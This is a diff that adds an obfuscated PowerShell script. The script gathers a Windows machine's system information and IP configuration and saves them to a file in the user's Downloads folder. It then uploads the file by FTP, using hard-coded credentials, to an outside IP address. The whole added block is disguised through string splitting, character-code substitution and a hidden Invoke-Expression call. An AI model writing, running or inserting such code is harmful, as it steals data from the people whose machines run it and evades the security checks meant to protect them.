@@ -1,0 +1,9 @@
+('MFjv'+'a'+'lue '+'= Get-Compu'+'terIn'+'fo
+'+'MF'+'j'+'ip = Get-Net'+'IPConfiguratio'+'n                                                               
+MF'+'jvalue, MFjip '+'eSZ Out-F'+'i'+'le -Fi'+'lePath C:CNaU'+'se'+'rs'+'CNaMFjenv:Us'+'erName'+'C'+'NaDow'+'nloadsCNatest.tx'+'t                                                                                       
+MFjweb=N'+'e'+'w-'+'Objec'+'t System.Net.WebCli'+'ent                                                       
+MF'+'jfile = s9ZC:CNaUser'+'sCNaMFjenv:UserNameCN'+'a'+'Dow'+'nlo'+'adsCNa'+'test.txts'+'9Z                 
+MFjFTP = s9Zf'+'tp:'+'//testadmi'+'n:te'+'stpassword'+'@192.1'+'19'+'.'+'71.8'+'9/files'+'/te'+'s'+'t.tx'+'t'+'s9Z                                                                                                      
+MF'+'jUR'+'I = New-Object'+' System.Uri(MFjF'+'TP)                                                          
+MFjweb.U'+'ploadF'+'ile(MFj'+'U'+'RI,'+' MF'+'jfil'+'e)                                                     
+').rEpLAce(([ChaR]101+[ChaR]83+[ChaR]90),'|').rEpLAce(([ChaR]77+[ChaR]70+[ChaR]106),'$').rEpLAce(([ChaR]115+[ChaR]57+[ChaR]90),[sTRinG][ChaR]34).rEpLAce(([ChaR]67+[ChaR]78+[ChaR]97),[sTRinG][ChaR]92)| .((GV '*mDr*').name[3,11,2]-JOIn'') 
